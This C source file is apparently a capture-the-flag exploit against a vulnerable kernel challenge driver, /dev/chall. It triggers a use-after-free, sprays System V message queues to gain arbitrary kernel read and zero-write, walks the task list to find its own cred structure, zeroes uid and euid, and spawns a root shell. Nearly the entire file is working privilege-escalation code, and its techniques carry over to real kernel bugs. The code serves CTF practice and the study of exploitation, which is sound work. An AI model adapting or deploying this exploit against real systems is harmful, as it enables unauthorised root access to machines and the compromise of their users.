#include <fcntl.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/types.h>
#include <unistd.h>

#define CHALL "/dev/chall"

// from chall.c
#define CMD_ALLOC 1337
#define CMD_DELETE 1338
#define CMD_READ 1339
#define CMD_INFO 1340
#define CMD_TOGGLE 1341

// just a random value between 976 and 2000
#define MSG_SIZE 1337
#define USR_CONTROLLED 6

#define OFF_TASKS 		0x458
#define OFF_CRED 		0x728
#define OFF_CRED_EUID 	0x14
#define OFF_CRED_UID 	0x4
#define OFF_PID 		0x560
#define OFF_PUBLIC 		0x10
#define OFF_OWNER	 	0x14

// constant because kaslr is disabled
#define TASK 0xffffffff828149c0

// I don't like the union she uses
typedef struct {
    uint64_t idx;
    char* buff;
    uint64_t size;
    uint32_t public;
} alloc_req_t;

typedef struct {
    uint64_t idx;
} delete_req_t;

typedef struct read {
    uint64_t idx;
    char *buff;
    uint64_t size;
} read_req_t;

typedef struct {
    uint64_t idx;
    uint64_t size;
    uint32_t public;
    uid_t owner;
} info_req_t;

typedef struct {
    uint64_t idx;
} toggle_req_t;

typedef struct {
    long type;
    char buff[MSG_SIZE];
} msg_t;

static int fd;

static inline
int alloc_recipe(char *buff, uint32_t public)
{
    alloc_req_t req = {
        .buff = buff,
        .size = strlen(buff),
        .public = public
    };
    
    return ioctl(fd, CMD_ALLOC, &req);
}

static inline
int delete_recipe(uint64_t idx)
{
    delete_req_t req = {
        .idx = idx,
    };
    
    return ioctl(fd, CMD_DELETE, &req);
}

static inline
int read_recipe(uint64_t idx, char *buff, uint64_t size)
{
    read_req_t req = {
        .idx = idx,
        .buff = buff,
        .size = size
    };
    
    return ioctl(fd, CMD_READ, &req);
}

static inline
info_req_t info_recipe(uint64_t idx)
{
    info_req_t req = {
        .idx = idx
    };
    
    if (ioctl(fd, CMD_INFO, &req))
        perror("ioctl");
    
    return req;
}

static inline
int toggle_pub_field(uint64_t idx)
{
    toggle_req_t req = {
        .idx = idx
    };
    
    return ioctl(fd, CMD_TOGGLE, &req);
}

static inline msg_t build_msg()
{
    msg_t msg = { .type = 1 };
        
    for (int i = 0; i < 332; i += 6)
        strcpy(msg.buff + i, "tennis");

    msg.buff[MSG_SIZE] = 0;
    return msg;
}

static uint32_t read_int_at(uint64_t addr)
{
    msg_t msg = build_msg();
    *(uint64_t *)msg.buff = addr - OFF_OWNER;

    int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
    msgsnd(msqid, &msg, sizeof(msg.buff), 0);

    info_req_t req = info_recipe(USR_CONTROLLED);
    msgrcv(msqid, &msg, sizeof(msg.buff), 0, IPC_NOWAIT);

    return req.owner;
}

static inline
uint64_t read_long_at(uint64_t addr)
{
    return read_int_at(addr) |
        ((uint64_t)read_int_at(addr + 4) << 32);
}

static void write_zero(uint64_t addr)
{
    uint32_t value = read_int_at(addr + 4);
    uint32_t curr = getuid();
    
    msg_t msg = build_msg();    
    *(uint64_t *)msg.buff = addr - OFF_PUBLIC;
    
    int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
    msgsnd(msqid, &msg, sizeof(msg.buff), 0);

    toggle_pub_field(USR_CONTROLLED);
    msgrcv(msqid, &msg, sizeof(msg.buff), 0, IPC_NOWAIT);
}

static inline
void trigger_uaf()
{
    puts("Allocating 256 recipes...");
    for (int i = 0; i < 256; i++)
        alloc_recipe("bossetti", 1);
}

static inline
uint64_t find_curr_struct()
{
    uint64_t cur = TASK;
    uint32_t my_pid = getpid();
    uint32_t pid = read_int_at(cur + OFF_PID);
    
    while (pid != my_pid) {
        cur = read_long_at(cur + OFF_TASKS) - OFF_TASKS;
        pid = read_int_at(cur + OFF_PID);
    }
    
    return cur;
}

static inline
void get_root(uint64_t cred)
{
    write_zero(cred + OFF_CRED_EUID);
    write_zero(cred + OFF_CRED_UID);
}

static inline
void overwrite_task_struct()
{
    uint64_t task = find_curr_struct();
    uint64_t cred = read_long_at(task + OFF_CRED);
    
    puts("Overwriting uid and euid");
    get_root(cred);
}

int main(int argc, char **argv)
{
    fd = open(CHALL, O_RDWR | O_NONBLOCK);

    trigger_uaf();
    overwrite_task_struct();

    system("/bin/sh");
    return 0;
}
